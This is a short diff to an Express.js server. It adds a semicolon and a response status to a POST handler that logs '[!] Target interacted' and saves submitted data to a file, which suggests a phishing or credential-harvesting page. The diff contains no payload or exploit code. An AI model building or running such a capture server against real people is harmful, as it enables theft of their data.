@@ -22,7 +22,8 @@ app.set('view engine', 'ejs');
 app.get('/', (req, res)=>{
     const ip = req.ip;
     res.render("index");
-})
+});
+
 app.post('/', (req, res)=>{
     console.log()
     console.log("[!] Target interacted")
@@ -34,6 +35,7 @@ app.post('/', (req, res)=>{
     if(err) throw err;
         console.log('[!] Data Saved successfully!');
     })
+    res.status(200)
 })
 
 app.listen(port, ()=>{
